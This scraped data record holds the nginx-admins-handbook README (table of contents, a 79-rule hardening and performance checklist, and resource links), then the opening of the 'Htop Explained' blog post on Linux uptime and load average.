SystemTap stapxx Separation and improvement of installation methods Installation Nginx on CentOS 7 Installation OpenResty on CentOS 7 Installation Tengine on Ubuntu 18.04 Installation Nginx on FreeBSD 11.3 Installation Nginx on FreeBSD 11.3 (from ports) Monitoring CollectD, Prometheus, and Grafana nginx-vts-exporter CollectD, InfluxDB, and Grafana Telegraf, InfluxDB, and Grafana Testing Build OpenSSL 1.0.2-chacha version Send request and show response headers Send request with http method, user-agent, follow redirects and show response headers Send multiple requests Testing SSL connection Testing SSL connection (debug mode) Testing SSL connection with SNI support Testing SSL connection with specific SSL version Testing SSL connection with specific cipher Verify 0-RTT Testing SCSV Load testing with ApacheBench (ab) Standard test Test with Keep-Alive header Load testing with wrk2 Standard scenarios POST call (with Lua) Random paths (with Lua) Multiple paths (with Lua) Random server address to each thread (with Lua) Multiple json requests (with Lua) Debug mode (with Lua) Analyse data pass to and from the threads Parsing wrk result and generate report Load testing with locust Multiple paths Multiple paths with different user sessions TCP SYN flood Denial of Service attack HTTP Denial of Service attack Debugging Show information about processes Check memory usage Show open files Check segmentation fault messages Dump configuration Get the list of configure arguments Check if the module has been compiled Show the most accessed IP addresses (ip and url) Show the most requested urls with http methods Show the most accessed response codes Calculating requests per second with IP addresses and urls Check that the gzip_static module is working Which worker processing current request Capture only http packets Extract User Agent from the http packets Capture only http GET and POST packets Capture requests and filter by source ip and destination port Capture HTTP requests/responses in real time, filter by GET, HEAD and save to a file Server Side Include (SSI) debugging Dump a process's memory GNU Debugger (gdb) Dump configuration from a running process Show debug log in memory Core dump backtrace Debugging socket leaks SystemTap cheatsheet stapxx Errors & Issues Common errors Configuration snippets Nginx server header removal Custom log formats Log only 4xx/5xx Restricting access with client certificate Restricting access by geographical location GeoIP 2 database Custom error pages Dynamic error pages with SSI Limiting the rate of requests per IP with geo and map Using trailing slashes Properly redirect all HTTP requests to HTTPS Adding and removing the www prefix Proxy/rewrite and keep the original URL Proxy/rewrite and keep the part of original URL Proxy/rewrite without changing the original URL (in browser) Modify 301/302 response body Redirect POST request with payload to external endpoint Route to different backends based on HTTP method Redirect users with certain IP to special location Allow multiple cross-domains using the CORS headers Set correct scheme passed in X-Forwarded-Proto Securing URLs with the Secure Link Module Tips and methods for high load traffic testing (cheatsheet) Location matching examples Passing requests to the backend The HTTP backend server The uWSGI backend server The FastCGI backend server The memcached backend server The Redis backend server HTTPS traffic to upstream servers TCP and UDP load balancing Lua snippets nginscripts snippets Other snippets Recreate base directory Create a temporary static backend Create a temporary static backend with SSL support Generate password file with htpasswd command Generate private key without passphrase Generate private key with passphrase Remove passphrase from private key Encrypt existing private key with a passphrase Generate CSR Generate CSR (metadata from existing certificate) Generate CSR with -config param Generate private key and CSR List available EC curves Generate ECDSA private key Generate private key and CSR (ECC) Generate self-signed certificate Generate self-signed certificate from existing private key Generate self-signed certificate from existing private key and csr Generate multidomain certificate (Certbot) Generate wildcard certificate (Certbot) Generate certificate with 4096 bit private key (Certbot) Generate DH public parameters Display DH public parameters Extract certs from p7b Convert DER to PEM Convert PEM to DER Verification of the certificate's supported purposes Verification of the private key Check private key Get public key from private key Verification of the public key Verification of the certificate Verification of the CSR Check the private key and the certificate are match TLSv1.3 and CCM ciphers Base Rules Format, prettify and indent your Nginx code Never use a hostname in a listen or upstream directives Set the HTTP headers with add_header and proxy*header directives properly Making a rewrite absolute (with scheme) Use return directive for URL redirection (301, 302) Use simple custom error pages Configure log rotation policy Don't duplicate index directive, use it only in the http block Debugging Improve debugging by disable daemon, master process, and all workers except one Use core dumps to figure out why NGINX keep crashing Use mirror module to copy requests to another backend Dynamic debugging with echo module Dynamic debugging with SSI Performance Enable OCSP Stapling Avoid multiple index directives Use $request_uri to avoid using regular expressions Use try_files directive to ensure a file exists Don't pass all requests to the backend - use try_files Use return directive instead of rewrite for redirects Enable PCRE JIT to speed up processing of regular expressions Set proxy timeouts for normal load and under heavy load Configure kernel parameters for high load traffic Activate the cache for connections to upstream servers Hardening Keep NGINX up-to-date Take care about your ACL rules Use only the latest supported OpenSSL version Remove support for legacy and risky HTTP request headers Prevent Replay Attacks on Zero Round-Trip Time Prevent caching of sensitive data Limit concurrent connections Set properly files and directories permissions (also with acls) on a paths Implement HTTPOnly and secure attributes on cookies Reverse Proxy Use pass directive compatible with backend protocol Be careful with trailing slashes in proxy_pass directive Set and pass Host header only with $host variable Set properly values of the X-Forwarded-For header Don't use X-Forwarded-Proto with $scheme behind reverse proxy Always pass Host, X-Real-IP, and X-Forwarded headers to the backend Use custom headers without X- prefix Always use $request_uri instead of $uri in proxy_pass Set proxy buffers and timeouts Others Set the certificate chain correctly Define security policies with security.txt Use tcpdump to diagnose and troubleshoot the HTTP issues If you have any idea, send it back to me or add a pull request. RSS Feed & Updates GitHub exposes an RSS/Atom feed of the commits, which may also be useful if you want to be kept informed about all changes. Checklist to rule them all This checklist was the primary aim of the nginx-admins-handbook. It contains a set of best practices and recommendations on how to configure and maintain the NGINX properly. This checklist contains all rules (79) from this handbook. Generally, I think that each of these principles is important and should be considered. I separated them into four levels of priority to help guide your decision. PRIORITY NAME AMOUNT DESCRIPTION critical 33 definitely use this rule, otherwise it will introduce high risks of your NGINX security, performance, and other major 26 it's also very important but not critical, and should still be addressed at the earliest possible opportunity normal 12 there is no need to implement but it is worth considering because it can improve the NGINX working and functions minor 8 as an option to implement or use (not required) Remember, these are only guidelines. My point of view may be different from yours so if you feel these priority levels do not reflect your configurations commitment to security, performance or whatever else, you should adjust them as you see fit. RULE CHAPTER PRIORITY Define the listen directives with address:port pairPrevents soft mistakes which may be difficult to debug. Base Rules Prevent processing requests with undefined server namesIt protects against configuration errors, e.g. traffic forwarding to incorrect backends. Base Rules Never use a hostname in a listen or upstream directivesWhile this may work, it will comes with a large number of issues. Base Rules Set the HTTP headers with add_header and proxy_*_header directives properlySet the right security headers for all contexts. Base Rules Configure log rotation policySave yourself trouble with your web server: configure appropriate logging policy. Base Rules Use simple custom error pagesDefault error pages reveals information which leads to information leakage vulnerability. Base Rules Use HTTP/2HTTP/2 will make our applications faster, simpler, and more robust. Performance Always keep NGINX up-to-dateUse newest NGINX package to fix vulnerabilities, bugs, and to use new features. Hardening Run as an unprivileged userUse the principle of least privilege. This way only master process runs as root. Hardening Protect sensitive resourcesHidden directories and files should never be web accessible. Hardening Take care about your ACL rulesTest your access-control lists and to stay secure. Hardening Hide upstream proxy headersDon't expose what version of software is running on the server. Hardening Remove support for legacy and risky HTTP request headersSupports for the offending headers should be removed. Hardening Force all connections over TLSProtects your website for handle sensitive communications. Hardening Use min. 2048-bit for RSA and 256-bit for ECC2048 bit (RSA) or 256 bit (ECC) keys are sufficient for commercial use. Hardening Keep only TLS 1.3 and TLS 1.2Use TLS with modern cryptographic algorithms and without protocol weaknesses. Hardening Use only strong ciphersUse only strong and not vulnerable cipher suites. Hardening Use more secure ECDH CurveUse ECDH Curves with according to NIST recommendations. Hardening Use strong Key Exchange with Perfect Forward SecrecyEstablishes a shared secret between two parties that can be used for secret communication. Hardening Defend against the BEAST attackThe server ciphers should be preferred over the client ciphers. Hardening Enable HTTP Strict Transport SecurityTells browsers that it should only be accessed using HTTPS, instead of using HTTP. Hardening Reduce XSS risks (Content-Security-Policy)CSP is best used as defence-in-depth. It reduces the harm that a malicious injection can cause. Hardening Control the behaviour of the Referer header (Referrer-Policy)The default behaviour of referrer leaking puts websites at risk of privacy and security breaches. Hardening Provide clickjacking protection (X-Frame-Options)Defends against clickjacking attack. Hardening Prevent some categories of XSS attacks (X-XSS-Protection)Prevents to render pages if a potential XSS reflection attack is detected. Hardening Prevent Sniff Mimetype middleware (X-Content-Type-Options)Tells browsers not to sniff MIME types. Hardening Reject unsafe HTTP methodsOnly allow the HTTP methods for which you, in fact, provide services. Hardening Prevent caching of sensitive dataIt helps to prevent critical data (e.g. credit card details, or username) leaked. Hardening Limit concurrent connectionsLimit concurrent connections to prevent a rogue guys from repeatedly connecting to and monopolizing NGINX. Hardening Use pass directive compatible with backend protocolSet pass directive only to working with compatible backend layer protocol. Reverse Proxy Set properly values of the X-Forwarded-For headerIdentify clients communicating with servers located behind the proxy. Reverse Proxy Don't use X-Forwarded-Proto with $scheme behind reverse proxyPrevent pass incorrect value of this header. Reverse Proxy Always use $request_uri instead of $uri in proxy_passYou should always pass unchanged URI to the backend layer. Reverse Proxy Organising Nginx configurationWell organised code is easier to understand and maintain. Base Rules Format, prettify and indent your Nginx codeFormatted code is easier to maintain, debug, and can be read and understood in a short amount of time. Base Rules Use reload option to change configurations on the flyGraceful reload of the configuration without stopping the server and dropping any packets. Base Rules Use return directive for URL redirection (301, 302)The by far simplest and fastest because there is no regexp that has to be evaluated. Base Rules Maintaining SSL sessionsImproves performance from the clients perspective. Performance Enable OCSP StaplingEnable to reduce the cost of an OCSP validation. Performance Use exact names in a server_name directive if possibleHelps speed up searching using exact names. Performance Avoid checks server_name with if directiveIt decreases NGINX processing requirements. Performance Use $request_uri to avoid using regular expressionsBy default, the regex is costly and will slow down the performance. Performance Use try_files directive to ensure a file existsUse it if you need to search for a file, it saving duplication of code also. Performance Use return directive instead of rewrite for redirectsUse return directive to more speedy response than rewrite. Performance Enable PCRE JIT to speed up processing of regular expressionsNGINX with PCRE JIT is much faster than without it. Performance Activate the cache for connections to upstream servers Nginx can now reuse its existing connections (keepalive) per upstream. Performance Disable unnecessary modulesLimits vulnerabilities, improve performance and memory efficiency. Hardening Hide Nginx version numberDon't disclose sensitive information about NGINX. Hardening Hide Nginx server signatureDon't disclose sensitive information about NGINX. Hardening Use only the latest supported OpenSSL versionStay protected from SSL security threats and don't miss out of new features. Hardening Prevent Replay Attacks on Zero Round-Trip Time0-RTT is disabled by default but you should know that enabling this option creates a significant security risks. Hardening Mitigation of CRIME/BREACH attacksDisable HTTP compression or compress only zero sensitive content. Hardening Deny the use of browser features (Feature-Policy)A mechanism to allow and deny the use of browser features. Hardening Control Buffer Overflow attacksPrevents errors are characterised by the overwriting of memory fragments of the NGINX process. Hardening Mitigating Slow HTTP DoS attacks (Closing Slow Connections)Prevents attacks in which the attacker sends HTTP requests in pieces slowly. Hardening Set and pass Host header only with $host variableUse of the $host is the only one guaranteed to have something sensible. Reverse Proxy Always pass Host, X-Real-IP, and X-Forwarded headers to the backendIt gives you more control of forwarded headers. Reverse Proxy Set the certificate chain correctlySend the complete chain to the client. Others Enable DNS CAA PolicyAllows domain name holders to indicate to CA whether they are authorized to issue digital certificates. Others Separate listen directives for 80 and 443 portsHelp you maintain and modify your configuration. Base Rules Use only one SSL config for the listen directivePrevents multiple configurations on the same listening address. Base Rules Use geo/map modules instead of allow/denyProvides the perfect way to block invalid visitors. Base Rules Set global root directory for unmatched locationsSpecifies the root directory for an undefined locations. Base Rules Don't duplicate index directive, use it only in the http blockWatch out for duplicating the same rules. Base Rules Adjust worker processesYou can adjust this value to maximum throughput under high concurrency. Performance Make an exact location match to speed up the selection processExact location matches are often used to speed up the selection process. Performance Use limit_conn to improve limiting the download speedLimits NGINX download speed per connection. Performance Be careful with trailing slashes in proxy_pass directiveIncorrect setting could end up with some strange url. Reverse Proxy Use custom headers without X- prefixThe use of custom headers with X- prefix is discouraged. Reverse Proxy Tweak passive health checksImprove behaviour of the passive health checks. Load Balancing Define security policies with security.txtHelps make things easier for companies and security researchers. Others Map all the things...Map module provides a more elegant solution for clearly parsing a big list of regexes. Base Rules Use custom log formatsThis is extremely helpful for debugging specific location directives. Debugging Use debug mode to track down unexpected behaviourThere's probably more detail than you want, but that can sometimes be a lifesaver. Debugging Improve debugging by disable daemon, master process, and all workers except oneThis simplifies the debugging and lets test configurations rapidly. Debugging Use core dumps to figure out why NGINX keep crashingEnable core dumps when your NGINX instance receive an unexpected error or when it crashed. Debugging Use mirror module to copy requests to another backendUse mirroring for investigation and debugging of any original request. Debugging Don't disable backends by comments, use down parameterIs a good solution to marks the server as permanently unavailable. Load Balancing Use tcpdump to diagnose and troubleshoot the HTTP issuesUse tcpdump to monitor HTTP. Others Bonus Stuff You can find here a few of the different things I've worked and included to this repository. I hope that these extras will be useful. Configuration reports Many of these recipes have been applied to the configuration of my old private website. An example configuration is in the configuration examples chapter. It's also based on this version of printable high-res hardening cheatsheets. SSL Labs Read about SSL Labs grading here (SSL Labs Grading 2018). Short SSL Labs grades explanation: A+ is clearly the desired grade, both A and B grades are acceptable and result in adequate commercial security. The B grade, in particular, may be applied to configurations designed to support very wide audiences (for old clients). I finally got A+ grade and following scores: Certificate = 100% Protocol Support = 100% Key Exchange = 90% Cipher Strength = 90% Look also at the following recommendations. I believe the right configuration of NGINX should give the following SSL Labs scores and provides the best security for the most cases: Recommended A/A+ Certificate: 100/100 Protocol Support: 95/100 Key Exchange: 90/100 Cipher Strength: 90/100 Perfect but restrictive A+ Certificate: 100/100 Protocol Support: 100/100 Key Exchange: 100/100 Cipher Strength: 100/100 Something about SSL Labs grading mechanism (that's an interesting point of view): The whole grading mechanism is more propaganda and public relations than actual security. If you want good security, then you must mind the details and understand how things work internally. If you want a good grade then you should do whatever it takes to have a good grade. An \"A+\" from SSL Labs is a very nifty thing to add at the end of a report, but it does not really equate with having rock solid security. Having an \"A+\" equates with being able to say \"I have an A+\". - from this answer by Tom Leek. Mozilla Observatory Read about Mozilla Observatory here and about Observatory Scoring Methodology. I also got the highest summary note (A+) on the Observatory with a very high test score (120/100, max. 135/100): Printable hardening cheatsheets I created two versions of printable posters with hardening cheatsheets (High-Res 5000x8800) based on recipes from this handbook: For xcf and pdf formats please see this directory. A+ with all 100%s on @ssllabs and 120/100 on @mozilla observatory: It provides the highest scores of the SSL Labs test. Setup is very restrictive with 4096-bit private key, only TLS 1.2, and also modern strict TLS cipher suites (non 128-bits). Think carefully about its use (no TLS 1.3, restrictive cipher suites), in my opinion, it is only suitable for obtaining the highest possible rating and seems a little impractical. A+ on @ssllabs and 120/100 on @mozilla observatory with TLS 1.3 support: It provides less restrictive setup with 2048-bit key for RSA or 256-bit key for ECC, TLS 1.3 and 1.2, modern strict TLS cipher suites (128/256-bits), and 2048-bit predefined DH groups recommended by Mozilla. The final grade is also in line with the industry standards and guidance. Recommend using this, for me, it is very reasonable configuration. Fully automatic installation I created a set of scripts for unattended installation of NGINX from the raw, uncompiled code. It allows you to easily install, create a setup for dependencies (like zlib or openssl), and customized with installation parameters. For more information please see Installing from source - Automatic installation chapter which describes the installation of NGINX on systems/distros such as Ubuntu, Debian, CentOS, and FreeBSD. Static error pages generator I created a simple to use generator for static pages to replace the default error pages that comes with any web server like NGINX. For more information please see HTTP Static Error Pages Generator. Server names parser I added scripts for fast multiple domain searching in the configuration. These tools get specific server_name matches and print them on the screen as a server { ... } blocks. Both are very helpful if you really have tons of domains or if you want to list specific vhosts from file or the active configuration. You must follow one important rule to be able to use it. Your server block must have the following structure: server { server_name example.com example.org; ... # other directives } Example of use: ./snippets/server-name-parser/check-server-name.sh example.com Searching 'example.com' in '/usr/local/etc/nginx' (from disk) /usr/local/etc/nginx/domains/example.com/servers.conf:79: return 301 https://example.com$request_uri; /usr/local/etc/nginx/domains/example.com/servers.conf:252: return 301 https://example.com$request_uri; /usr/local/etc/nginx/domains/example.com/servers.conf:3825: server_name example.com; Searching 'example.com' in server contexts (from a running process) >>>>>>>>>> BEG >>>>>>>>>> server { include listen/192.168.252.10/https.example.com.conf; server_name example.com; location / { return 204 \"RFC 792\"; } access_log /var/log/nginx/example.com/access.log standard; error_log /var/log/nginx/example.com/error.log warn; } <<<<<<<<<< END <<<<<<<<<< For more information please see snippets/server-name-parser directory. Books Nginx Essentials Authors: Valery Kholodkov Excel in Nginx quickly by learning to use its most essential features in real-life applications. Learn how to set up, configure, and operate an Nginx installation for day-to-day use Explore the vast features of Nginx to manage it like a pro, and use them successfully to run your website Example-based guide to get the best out of Nginx to reduce resource usage footprint This short review comes from this book or the store. Nginx Cookbook Authors: Derek DeJonghe Youll find recipes for: Traffic management and A/B testing Managing programmability and automation with dynamic templating and the NGINX Plus API Securing access through encrypted traffic, secure links, HTTP authentication subrequests, and more Deploying NGINX to AWS, Azure, and Google cloud-computing services Using Docker to deploy containers and microservices Debugging and troubleshooting, performance tuning, and practical ops tips This short review comes from this book or the store. Nginx HTTP Server Authors: Martin Fjordvald, Clement Nedelcu Harness the power of Nginx to make the most of your infrastructure and serve pages faster than ever. Discover possible interactions between Nginx and Apache to get the best of both worlds Learn to exploit the features offered by Nginx for your web applications Get your hands on the most updated version of Nginx (1.13.2) to support all your web administration requirements This short review comes from this book or the store. Nginx High Performance Authors: Rahul Sharma Optimize NGINX for high-performance, scalable web applications. Configure Nginx for best performance, with configuration examples and explanations Step-by-step tutorials for performance testing using open source software Tune the TCP stack to make the most of the available infrastructure This short review comes from this book or the store. Mastering Nginx Authors: Dimitri Aivaliotis Written for experienced systems administrators and engineers, this book teaches you from scratch how to configure Nginx for any situation. Step-by-step instructions and real-world code snippets clarify even the most complex areas. This short review comes from this book or the store. ModSecurity 3.0 and NGINX: Quick Start Guide Authors: Faisal Memon, Owen Garrett, Michael Pleshakov Learn in this ebook how to get started with ModSecurity, the worlds most widely deployed web application firewall (WAF), now available for NGINX and NGINX Plus. This short review comes from this book or the store. Cisco ACE to NGINX: Migration Guide Authors: Faisal Memon This ebook provides step-by-step instructions on replacing Cisco ACE with NGINX and off-the-shelf servers. NGINX helps you cut costs and modernize. In this ebook you will learn: How to migrate Cisco ACE configuration to NGINX, with detailed examples Why you should go with a software load balancer, and not hardware This short review comes from this book or the store. External Resources Nginx official Nginx Project Nginx Documentation Nginx Wiki Nginx Admin's Guide Nginx Pitfalls and Common Mistakes Development Guide Nginx Forum Nginx Security Advisories Nginx Security Controls Nginx Mailing List Nginx Read-only Mirror NGINX-Demos Thread Pools in NGINX Boost Performance 9x! Nginx distributions OpenResty The Tengine Web Server Comparison reviews NGINX vs. Apache (Pro/Con Review, Uses, & Hosting for Each) Web cache server performance benchmark: nuster vs nginx vs varnish vs squid Cheatsheets & References agentzh's Nginx Tutorials Introduction to nginx.conf scripting Nginx discovery journey Nginx Guts Nginx Cheatsheet Nginx Tutorials, Linux Sysadmin Configuration & Optimizing Tips and Tricks Nginx boilerplate configs Awesome Nginx configuration template Nginx Quick Reference A collection of resources covering Nginx and more A collection of useful Nginx configuration snippets Nginx configurations for most popular CMS/CMF/Frameworks based on PHP Boilerplate configuration for nginx and certbot with docker-compose Performance & Hardening Nginx Tuning For Best Performance by Denji Nginx Optimization: understanding sendfile, tcp_nodelay and tcp_nopush How we scaled nginx and saved the world 54 years every day TLS has exactly one performance problem: it is not used widely enough SSL/TLS Deployment Best Practices SSL Server Rating Guide SSL Pulse How to Build a Tough NGINX Server in 15 Steps Top 25 Nginx Web Server Best Security Practices Nginx Secure Web Server Strong SSL Security on Nginx Enable cross-origin resource sharing (CORS) NAXSI - WAF for Nginx ModSecurity for Nginx Presentations & Videos NGINX: Basics and Best Practices NGINX Installation and Tuning Nginx Internals (by Joshua Zhu) Nginx internals (by Liqiang Xu) How to secure your web applications with NGINX Tuning TCP and NGINX on EC2 Extending functionality in nginx, with modules! Nginx - Tips and Tricks. Nginx Scripting - Extending Nginx Functionalities with Lua How to handle over 1,200,000 HTTPS Reqs/Min Using ngx_lua / lua-nginx-module in pixiv Reading nginx CHANGES together Dynamic modules:how it works NGINX Conf 2014 NGINX Conf 2015 NGINX Conf 2016 NGINX Conf 2017 NGINX Conf 2018 | Deep Dive Track NGINX Conf 2018 | Keynotes and Sessions Making HTTPS Fast(er): Ilya Grigorik @ nginx.conf 2014 Playgrounds NGINX Rate Limit, Burst and nodelay sandbox Config generators nginxconfig - Nginx config generator on steroids. ssl-config-generator - Mozilla SSL Configuration Generator. nginx-config-builder - is a python library for building nginx configuration files programatically. Config parsers crossplane - quick and reliable way to convert NGINX configurations into JSON and back. nginxparser - parses nginx configuration with Pyparsing. Config managers ansible-role-nginx - asible role to install and manage nginx configuration. ansible-role-nginx - installs and configures the latest version of Nginx. ansible-role-nginx - installs NGINX, NGINX Plus, the NGINX Amplify agent, and more. puppet-nginx - puppet module to manage NGINX on various UNIXes. Static analyzers gixy - is a tool to analyze Nginx configuration to prevent security misconfiguration and automate flaw detection. nginx-config-formatter - Nginx config file formatter/beautifier written in Python. nginxbeautifier - format and beautify Nginx config files. nginx-minify-conf - creates a minified version of a Nginx configuration. Log analyzers GoAccess - is a fast, terminal-based log analyzer (quickly analyze and view web server statistics in real time). Graylog - is a leading centralized log management for capturing, storing, and enabling real-time analysis. Logstash - is an open source, server-side data processing pipeline. Performance analyzers ngxtop - parses your Nginx access log and outputs useful, top-like, metrics of your Nginx server. Builder tools Nginx-builder - is a tool for building deb or rpm package NGINX from the source code. Benchmarking tools ab - is a single-threaded command line tool for measuring the performance of HTTP web servers. siege - is an http load testing and benchmarking utility. wrk - is a modern HTTP benchmarking tool capable of generating significant load. wrk2 - is a constant throughput, correct latency recording variant of wrk. vegeta - HTTP load testing tool and library. bombardier - is a HTTP(S) benchmarking tool. gobench - is a HTTP/HTTPS load testing and benchmarking tool. hey - is a HTTP load generator, ApacheBench (ab) replacement, formerly known as rakyll/boom. boom - is a script you can use to quickly smoke-test your web app deployment. httperf - the httperf HTTP load generator. JMeter - is designed to load test functional behavior and measure performance. Gatling - is a powerful open-source load and performance testing tool for web applications. locust - is an easy-to-use, distributed, user load testing tool. slowloris - low bandwidth DoS tool. Slowloris rewrite in Python. slowhttptest - application layer DoS attack simulator. GoldenEye - GoldenEye Layer 7 (KeepAlive+NoCache) DoS test tool. Debugging tools strace - is a diagnostic, debugging and instructional userspace utility (linux syscall tracer) for Linux. GDB - allows you to see what is going on `inside' another program while it executes. SystemTap - provides infrastructure to simplify the gathering of information about the running Linux system. stapxx - simple macro language extensions to SystemTap. htrace.sh - is a simple Swiss Army knife for http/https troubleshooting and profiling. Security & Web testing tools Burp Suite - is a graphical tool for testing Web application security. w3af - is a Web Application Attack and Audit Framework. nikto - web server scanner which performs comprehensive tests. ssllabs-scan - client for SSL Labs APIs, designed for automated and/or bulk testing. http-observatory - Mozilla HTTP Observatory. testssl.sh - checks a server's service on any port for the support of TLS/SSL ciphers. sslyze - is a fast and powerful SSL/TLS server scanning library. cipherscan - is a very simple way to find out which SSL ciphersuites are supported by a target. O-Saft - OWASP SSL advanced forensic tool. Nghttp2 - is an implementation of HTTP/2 and its header compression algorithm HPACK in C. h2spec - is a conformance testing tool for HTTP/2 implementation. h2t - is a simple tool to help sysadmins to hardening their websites. http2fuzz - HTTP/2 fuzzer written in Golang. Arjun - HTTP parameter discovery suite. Corsy - CORS misconfiguration scanner. XSStrike - most advanced XSS scanner. Development Sample ebook generated from NGINX source code. Programming in Lua (first edition) Scripting Nginx with Lua Emillers Guide To Nginx Module Development Emillers Advanced Topics In Nginx Module Development NGINX Tutorial: Developing Modules An Introduction To OpenResty (nginx + lua) - Part 1 An Introduction To OpenResty - Part 2 - Concepts An Introduction To OpenResty - Part 3 OpenResty (Nginx) with dynamically generated certificates Programming OpenResty Online & Web tools SSL Server Test by SSL Labs Test SSL/TLS (PCI DSS, HIPAA and NIST) SSL analyzer and certificate checker Tools for testing SSL configuration Test your TLS server configuration (e.g. ciphers) Scan your website for non-secure content Analyze website security TLS Cipher Suite Search SSL/TLS Capabilities of Your Browser SSL-Client Info's Public Diffie-Hellman Parameter Service/Tool Analyse the HTTP response headers by Security Headers Analyze your website by Mozilla Observatory CAA Record Helper Linting tool that will help you with your site's accessibility, speed, security and more Service to scan and analyse websites Tool from above to either encode or decode a string of text Online translator for search queries on log data Online regex tester and debugger: PHP, PCRE, Python, Golang and JavaScript Online tool to learn, build, & test Regular Expressions Online Regex Tester & Debugger Tool for testing regular expressions directly within an NGINX configuration A web app for encryption, encoding, compression and data analysis Nginx location match tester Nginx location match visible Other stuff Web technology for developers Mozilla Web Security Application Security Wiki OWASP ASVS 3.0.1 OWASP ASVS 3.0.1 Web App OWASP ASVS 4.0 OWASP Top 10 Proactive Controls 2018. OWASP Testing Guide v4 OWASP Dev Guide Transport Layer Protection Cheat Sheet by OWASP OWASP WSTG Security/Server Side TLS by Mozilla Applied Crypto Hardening Browser support tables for modern web technologies Memorable site for testing clients against bad SSL configs The HTTPS-Only Standard The Web Security Academy Burp Scanner - Issue Definitions Web application security: what to do when... Transport Layer Security (TLS) Parameters TLS Redirection (and Virtual Host Confusion) TLS Security 6: Examples of TLS Vulnerabilities and Attacks Guidelines for Setting Security Headers Mozilla Guidelines - Web Security Secure your web application with these HTTP headers Security HTTP Headers Analysis of various reverse proxies, cache proxies, load balancers, etc. How HTTPS works ...in a comic! Regular-Expressions Regexp Security Cheatsheet HTTPS on Stack Overflow: The End of a Long Road The Architecture of Open Source Applications - Nginx BBC Digital Media Distribution: How we improved throughput by 4x The C10K problem by Dan Kegel The Secret To 10 Million Concurrent Connections High Performance Browser Networking The System Design Primer awesome-scalability Web Architecture 101 Learn where some of the network sysctl variables fit into the Linux/Kernel network flow jemalloc vs tcmalloc vs dlmalloc On the Impact of Memory Allocation on High-Performance Query Processing GLB: GitHubs open source load balancer What's next? Go back to the Table of Contents or read the next chapters: HTTP Basics Introduction to HTTP. SSL/TLS Basics Introduction to SSL/TLS. NGINX Basics Introduction and explanation of the NGINX mechanisms. Helpers One-liners, commands, utilities for building NGINX, and more. Base Rules (16) The basic set of rules to keep NGINX in a good condition. Debugging (5) A few things for troubleshooting configuration problems. Performance (13) Many methods to make sure the NGINX as fast as possible. Hardening (31) Security and hardening methods in line with best practices. Reverse Proxy (8) A few rules about the NGINX proxy server. Load Balancing (2) Some rules to improve NGINX as a load balancer. Others (4) Other interesting rules, not necessarily linked to NGINX. Configuration Examples Here are some configuration examples. ",
        "_version_": 1718527385362497536
      },
      {
        "story_id": [21414882],
        "story_author": ["anderspitman"],
        "story_descendants": [98],
        "story_score": [818],
        "story_time": ["2019-10-31T23:31:50Z"],
        "story_title": "Htop Explained",
        "search": [
          "Htop Explained",
          "https://peteris.rocks/blog/htop/",
          "For the longest time I did not know what everything meant in htop. I thought that load average 1.0 on my two core machine means that the CPU usage is at 50%. That's not quite right. And also, why does it say 1.0? I decided to look everything up and document it here. They also say that the best way to learn something is to try to teach it. Table of Contents htop on Ubuntu Server 16.04 x64UptimeLoad averageProcessesProcess ID / PIDProcess treeProcess userProcess stateR - running or runnable (on run queue)S - interruptible sleep (waiting for an event to complete)D - uninterruptible sleep (usually IO)Z - defunct (\"zombie\") process, terminated but not reaped by its parentT - stopped by job control signalt - stopped by debugger during the tracingProcess timeProcess niceness and priorityMemory usage - VIRT/RES/SHR/MEMVIRT/VSZ - Virtual ImageRES/RSS - Resident sizeSHR - Shared Mem sizeMEM% - Memory usageProcessesBefore/sbin/init/lib/systemd/systemd-journald/sbin/lvmetad -f/lib/systemd/udevd/lib/systemd/timesyncd/usr/sbin/atd -f/usr/lib/snapd/snapd/usr/bin/dbus-daemon/lib/systemd/systemd-logind/usr/sbin/cron -f/usr/sbin/rsyslogd -n/usr/sbin/acpid/usr/bin/lxcfs /var/lib/lxcfs//usr/lib/accountservice/accounts-daemon/sbin/mdadm/usr/lib/policykit-1/polkitd --no-debug/usr/sbin/sshd -D/sbin/iscsid/sbin/agetty --noclear tty1 linuxsshd: [emailprotected]/0 & -bash & htopAfterAppendixSource codeFile descriptors and redirectionColors in PuTTYShell in CTODOUpdatesFinal remarksT-shirt htop on Ubuntu Server 16.04 x64Here is a screenshot of htop that I am going to describe. UptimeUptime shows how long the system has been running. You can see the same information by running uptime: $ uptime 12:17:58 up 111 days, 31 min, 1 user, load average: 0.00, 0.01, 0.05 How does the uptime program know that? It reads the information from the file /proc/uptime. 9592411.58 9566042.33 The first number is the total number of seconds the system has been up. The second number is how much of that time the machine has spent idle, in seconds The second value may be greater than the overall system uptime on systems with multiple cores since it is a sum. How did I know that? I looked at what files the uptime program opens when it is run. We can use the strace tool to do that. strace uptime There will be a lot of output. We can grep for the open system call. But that will not really work since strace outputs everything to the standard error (stderr) stream. We can redirect the stderr to the standard output (stdout) stream with 2>&1. Our output is this: $ strace uptime 2>&1 | grep open ... open(\"/proc/uptime\", O_RDONLY) = 3 open(\"/var/run/utmp\", O_RDONLY|O_CLOEXEC) = 4 open(\"/proc/loadavg\", O_RDONLY) = 4 which contains the file /proc/uptime which I mentioned. It turns out that you can also use strace -e open uptime and not bother with grepping. So why do we need the uptime program if we can just read the contents of the file? The uptime output is nicely formatted for humans whereas the number of seconds is more useful for using in your own programs or scripts. Load averageIn addition to uptime, there were also three numbers that represent the load average. $ uptime 12:59:09 up 32 min, 1 user, load average: 0.00, 0.01, 0.03 They are taken from the /proc/loadavg file. If you take another look at the strace output, you'll see that this file was also opened. $ cat /proc/loadavg 0.00 0.01 0.03 1/120 1500 The first three columns represent the average system load of the last 1, 5, and 15 minute periods. The fourth column shows the number of currently running processes and the total number of processes. The last column displays the last process ID used. Let's start with the last number. Whenever you launch a new process, it is assigned an ID number. Process IDs are usually increasing, unless they've been exausted and are being reused. The process ID of 1 belongs to /sbin/init which is started at boot time. Let's look at the /proc/loadavg contents again and then launch the sleep command in the background. When it's launched in the background, its process ID will be shown. $ cat /proc/loadavg 0.00 0.01 0.03 1/123 1566 $ sleep 10 & [1] 1567 So the 1/123 means that there is one process running or ready to run at this time and there are 123 processed in total. When you run htop and see just one running process, it means that it is the htop process itself. If you run sleep 30 and run htop again, you'll notice that there is still just 1 running process. That's because sleep is not running, it is sleeping or idling or in other words waiting for something to happen. A running process is a process that is currently running on the physical CPU or waiting its turn to run on the CPU. If you run cat /dev/urandom > /dev/null which repeatedly generates random bytes and writes them to a special file that is never read from, you will see that there are now two running process. $ cat /dev/urandom > /dev/null & [1] 1639 $ cat /proc/loadavg 1.00 0.69 0.35 2/124 1679 So there are now two running processes (random number generation and the cat that reads the contents of 